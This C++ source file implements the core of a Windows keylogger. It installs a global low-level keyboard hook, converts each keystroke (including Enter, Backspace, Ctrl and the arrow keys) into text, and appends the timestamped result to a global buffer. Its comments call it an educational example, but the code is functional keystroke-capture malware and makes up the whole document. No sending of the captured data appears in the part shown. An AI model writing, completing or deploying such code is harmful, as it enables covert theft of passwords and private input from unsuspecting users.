#include "keylogger.h"
#include "globals.h"
#include "utils.h"
#include <windows.h>
#include <iostream>
#include <string>
#include <ctime>
#include <iomanip>
#include <sstream>
#include <chrono> // Add this missing include

using namespace std;

// The hook handle
HHOOK keyboard_hook = NULL;

// Local version of timestamp function to avoid dependency issues
string get_local_timestamp() {
    auto now = std::chrono::system_clock::now();
    auto time_t = std::chrono::system_clock::to_time_t(now);
    std::stringstream ss;
    ss << std::put_time(std::localtime(&time_t), "%Y-%m-%d %H:%M:%S");
    return ss.str();
}

// Keyboard hook callback function
LRESULT CALLBACK keyboard_hook_proc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
            DWORD vkCode = kbStruct->vkCode;
            
            // Convert virtual key code to character
            BYTE keyboardState[256] = {0};
            GetKeyboardState(keyboardState);
            
            char result[16] = {0};
            int count = ToAscii(vkCode, kbStruct->scanCode, keyboardState, (LPWORD)result, 0);
            
            // Format with timestamp
            string timestamp = get_local_timestamp();
            string key_press;
            
            if (count > 0) {
                key_press = string(result, count);
            } else {
                // Handle special keys
                switch (vkCode) {
                    case VK_RETURN:
                        key_press = "[ENTER]";
                        break;
                    case VK_BACK:
                        key_press = "[BACKSPACE]";
                        break;
                    case VK_TAB:
                        key_press = "[TAB]";
                        break;
                    case VK_SHIFT:
                    case VK_LSHIFT:
                    case VK_RSHIFT:
                        key_press = "[SHIFT]";
                        break;
                    case VK_CONTROL:
                    case VK_LCONTROL:
                    case VK_RCONTROL:
                        key_press = "[CTRL]";
                        break;
                    case VK_ESCAPE:
                        key_press = "[ESC]";
                        break;
                    case VK_SPACE:
                        key_press = " ";
                        break;
                    case VK_LEFT:
                        key_press = "[LEFT]";
                        break;
                    case VK_RIGHT:
                        key_press = "[RIGHT]";
                        break;
                    case VK_UP:
                        key_press = "[UP]";
                        break;
                    case VK_DOWN:
                        key_press = "[DOWN]";
                        break;
                    default:
                        key_press = "[0x" + to_string(vkCode) + "]";
                        break;
                }
            }
            
            // Add to global key_buffer
            extern string key_buffer;
            key_buffer += timestamp + ": " + key_press + "\n";
            
            if (g_debug_mode) {
                cout << "Keylogger captured: " << key_press << endl;
                cout << "Buffer size: " << key_buffer.size() << endl;
                cout.flush();
            }
        }
    }
    
    return CallNextHookEx(keyboard_hook, nCode, wParam, lParam);
}

// Start the keylogger
bool start_keylogger() {
    if (g_debug_mode) {
        cout << "Initializing keylogger..." << endl;
        cout.flush();
    }
    
    // Install keyboard hook
    keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboard_hook_proc, NULL, 0);
    
    if (keyboard_hook == NULL) {
        if (g_debug_mode) {
            cout << "Failed to install keyboard hook. Error: " << GetLastError() << endl;
            cout.flush();
        }
        return false;
    }
    
    if (g_debug_mode) {
        cout << "Keylogger hook installed successfully" << endl;
        cout.flush();
    }
    
    // Enter message loop to keep hook active
    // In a real implementation, we wouldn't block the main thread
    // but for our educational example, we'll run a limited loop
    if (g_debug_mode) {
        cout << "Entering keylogger message loop" << endl;
        cout.flush();
    }
    
    // Add initial test data to key_buffer
    extern string key_buffer;
    key_buffer += get_local_timestamp() + ": [KEYLOGGER_STARTED]\n";
      
    // We're not running a message loop here since we're in a console app
    // The main thread will keep the process alive
    return true;
}